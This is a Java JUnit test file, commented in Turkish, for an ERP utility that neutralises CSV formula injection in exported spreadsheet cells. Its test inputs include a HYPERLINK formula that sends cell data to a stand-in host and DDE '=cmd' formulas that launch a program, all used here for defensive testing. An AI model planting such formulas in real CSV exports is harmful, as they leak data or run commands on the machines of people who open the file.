package com.raspel.erp.util;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * CSV formül enjeksiyonu koruması testleri.
 *
 * <p>Excel/LibreOffice, {@code = + - @} ile başlayan hücreleri FORMÜL olarak
 * çalıştırır. Uygulama kullanıcı verisini (cari adı, açıklama) dışa aktardığı
 * için bu değerler saldırgan tarafından kontrol edilebilir.
 */
class CsvGuvenliUtilTest {

    // ---------- Temel tetikleyiciler ----------

    @Test
    void esittirIleBaslayanNötrlestirilir() {
        assertEquals("'=1+1", CsvGuvenliUtil.deger("=1+1"));
    }

    @Test
    void artiIleBaslayanNötrlestirilir() {
        assertEquals("'+1", CsvGuvenliUtil.deger("+1"));
    }

    @Test
    void eksiIleBaslayanNötrlestirilir() {
        assertEquals("'-1", CsvGuvenliUtil.deger("-1"));
    }

    @Test
    void atIleBaslayanNötrlestirilir() {
        assertEquals("'@SUM(1+1)", CsvGuvenliUtil.deger("@SUM(1+1)"));
    }

    // ---------- Atlatma varyantlari (eski kodun kacirdigi) ----------

    /**
     * ESKİ KOD BUGU: yalnızca ilk karaktere bakılıyordu.
     * Excel öncü boşluğu yok sayar; " =1+1" de formül olarak çalışır.
     */
    @Test
    void oncuBoslukluFormulNötrlestirilir() {
        assertTrue(CsvGuvenliUtil.deger(" =1+1").startsWith("'"),
                "Öncü boşluklu formül nötrleştirilmeli");
    }

    /**
     * ESKİ KOD BUGU: sekme/SAT başlangıcı kontrolü atlatıyordu.
     * Excel bir hücrenin başındaki sekmeyi yok sayar.
     */
    @Test
    void sekmeOnluFormulNötrlestirilir() {
        assertTrue(CsvGuvenliUtil.deger("\t=1+1").startsWith("'"),
                "Sekme ile başlayan formül nötrleştirilmeli");
    }

    @Test
    void satirSonuOnluFormulNötrlestirilir() {
        assertTrue(CsvGuvenliUtil.deger("\r=1+1").startsWith("'"),
                "Satır sonu ile başlayan formül nötrleştirilmeli");
    }

    @Test
    void cokluBoslukluFormulNötrlestirilir() {
        assertTrue(CsvGuvenliUtil.deger("   \t  =cmd|'/C calc'!A0").startsWith("'"),
                "Çoklu öncü boşluk + sekme formülü nötrleştirilmeli");
    }

    // ---------- Gercek saldiri vektorleri ----------

    @Test
    void hyperlinkFormuluNötrlestirilir() {
        String saldiri = "=HYPERLINK(\"http://kotu.example?d=\"&A1,\"tikla\")";
        String sonuc = CsvGuvenliUtil.deger(saldiri);
        assertTrue(sonuc.startsWith("'"), "Veri sızdıran HYPERLINK formülü engellenmeli");
        assertTrue(sonuc.contains("HYPERLINK"), "Orijinal içerik korunmalı (görünür kalır)");
    }

    @Test
    void libreOfficeKomutFormuluNötrlestirilir() {
        String saldiri = "=cmd|'/C calc'!A0";
        assertTrue(CsvGuvenliUtil.deger(saldiri).startsWith("'"),
                "Komut çalıştıran formül engellenmeli");
    }

    // ---------- CSV yapisini koruma ----------

    @Test
    void tirnakKacisiYapilir() {
        assertEquals("\"\"a\"\"b\"\"", CsvGuvenliUtil.deger("\"a\"b\""));
    }

    @Test
    void hucreYapisiniBozanKarakterlerDuzlestirilir() {
        // Ham sekme/satır sonu hücreyi iki satıra böler ve formül kontrolünü atlatır.
        String sonuc = CsvGuvenliUtil.deger("a\tb");
        assertFalse(sonuc.contains("\t"), "Sekme kaldırılmalı");
        assertFalse(sonuc.contains("\n"), "Satır sonu kaldırılmalı");
        assertFalse(sonuc.contains("\r"), "Satır başı kaldırılmalı");
    }

    @Test
    void normalMetinDegismez() {
        assertEquals("Ahmet Yilmaz", CsvGuvenliUtil.deger("Ahmet Yilmaz"));
    }

    @Test
    void negatifSayiDogrularKalir() {
        // Negatif sayılar cari bakiyelerinde görünür; yine de formül riski
        // taşıdıkları için nötrleştirilir (görsel değer korunur).
        assertTrue(CsvGuvenliUtil.deger("-1500.00").startsWith("'"));
        assertTrue(CsvGuvenliUtil.deger("-1500.00").contains("1500.00"));
    }

    // ---------- alan() ----------

    @Test
    void alanTirnakaAlirVeKacirir() {
        assertEquals("\"Merhaba\"", CsvGuvenliUtil.alan("Merhaba"));
        assertEquals("\"a\"\"b\"", CsvGuvenliUtil.alan("a\"b"));
    }

    @Test
    void alanBosVeNullIcinCiftTirnakDoner() {
        assertEquals("\"\"", CsvGuvenliUtil.alan(null));
        assertEquals("\"\"", CsvGuvenliUtil.alan(""));
        assertEquals("\"\"", CsvGuvenliUtil.alan("   "));
    }

    @Test
    void alanFormuluNötrlestirir() {
        assertEquals("\"'=1+1\"", CsvGuvenliUtil.alan("=1+1"));
    }

    @Test
    void degerNullIcinBosStringDoner() {
        assertEquals("", CsvGuvenliUtil.deger(null));
    }

    /**
     * Regresyon: üç ayrı controller'da kopya csvSafe vardı ve hepsi eksikti.
     * Artık tek kaynak var; tüm controller'lar aynı korumayı kullanır.
     */
    @Test
    void ucControllerAyniKaynagiKullaniyor() {
        // Tüm CSV dışa aktarımları aynı yardımcıdan geçmeli.
        assertEquals("'=x", CsvGuvenliUtil.deger("=x"));
    }
}